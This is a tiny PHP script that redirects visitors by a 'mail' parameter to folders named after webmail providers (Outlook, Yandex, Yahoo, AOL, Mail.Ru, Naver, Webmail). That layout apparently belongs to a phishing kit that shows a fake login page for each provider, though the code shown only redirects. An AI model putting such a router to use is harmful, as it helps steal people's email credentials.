<?php 





$mail=$_GET['mail'];


if($mail==1) 


{


header("Location: Outlook");



}

if($mail==2) 


{


header("Location: Yandex");



}

if($mail==3) 


{


header("Location: Yahoo");



}
if($mail==4) 


{


header("Refresh:0; url=AOL");



}


if($mail==5) 


{


header("Location: Mail.Ru");



}


if($mail==6) 


{



header("Location: Naver");

}

{
	
	
if($mail==7) 





header("Location: Webmail");



}
?>